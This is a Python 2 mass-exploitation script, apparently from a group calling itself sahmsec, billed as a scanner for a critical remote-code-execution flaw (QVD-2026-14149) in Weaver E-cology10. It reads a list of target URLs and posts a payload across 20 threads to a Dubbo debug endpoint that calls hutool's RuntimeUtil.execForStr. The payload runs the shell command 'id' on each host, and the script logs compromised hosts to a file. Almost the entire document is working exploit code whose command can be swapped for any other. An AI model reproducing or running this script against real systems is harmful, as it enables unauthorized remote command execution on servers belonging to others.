#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import requests
import threading
import json
import re
from multiprocessing.dummy import Pool as ThreadPool

# =======================
# Colors
# =======================
fr = "\033[91m"
fg = "\033[92m"
fy = "\033[93m"
fb = "\033[94m"
fc = "\033[96m"
rs = "\033[0m"

# =======================
# Thread-safe print
# =======================
print_lock = threading.Lock()

requests.packages.urllib3.disable_warnings()


def Exploit1(i):
    """
    Dubbo API RCE via RuntimeUtil.execForStr
    """
    i = i.strip().rstrip("/")

    url = i + "/papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json;charset=utf-8",
        "timeZoneOffset": "-480",
        "langType": "zh_CN",
        "Connection": "close"
    }

    # Execute command
    cmd = "id"
    payload = [[cmd]]

    try:
        r = requests.post(
            url,
            headers=headers,
            data=json.dumps(payload),
            timeout=10,
            verify=False
        )

        if r.status_code == 200 and "uid=" in r.text:
            with print_lock:
                print("  - %s --> %sExploited%s" % (i, fg, rs))

                # Extract uid using regex
                uid_match = re.search(r'uid=[^\\n]+', r.text)

                if uid_match:
                    print("   - Id : %s%s%s" % (fg, uid_match.group(0), rs))

            open("SAHMSEC_QVD-2026-14149-results.txt", "a").write(
                i + " | " + uid_match.group(0) + " | Exploited [sahmsec]\n"
            )

            return True

        else:
            with print_lock:
                print("  - %s --> %sNot_Vulnerable%s" % (i, fr, rs))

            return False

    except Exception:
        with print_lock:
            print("  - %s --> %sTime0ut%s" % (i, fr, rs))

        return False


# =======================
# MAIN
# =======================

banner = r'''

 [ONLINE]


   ███████╗ █████╗ ██╗  ██╗███╗   ███╗███████╗███████╗ ██████╗
   ██╔════╝██╔══██╗██║  ██║████╗ ████║██╔════╝██╔════╝██╔════╝
   ███████╗███████║███████║██╔████╔██║███████╗█████╗  ██║     
   ╚════██║██╔══██║██╔══██║██║╚██╔╝██║╚════██║██╔══╝  ██║     
   ███████║██║  ██║██║  ██║██║ ╚═╝ ██║███████║███████╗╚██████╗
   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝


                Weaver E-cology10 RCE Scanner
                      QVD-2026-14149


         [CVSS]     > 9.8
         [Severity] > Critical
         [Date]     > 13/03/2026

                     https://sahmsec.com

'''

print(banner)

path = raw_input(" - [WEBLIST] > ")
targets = open(path).read().splitlines()

pp = ThreadPool(20)
pp.map(Exploit1, targets)
pp.close()
pp.join()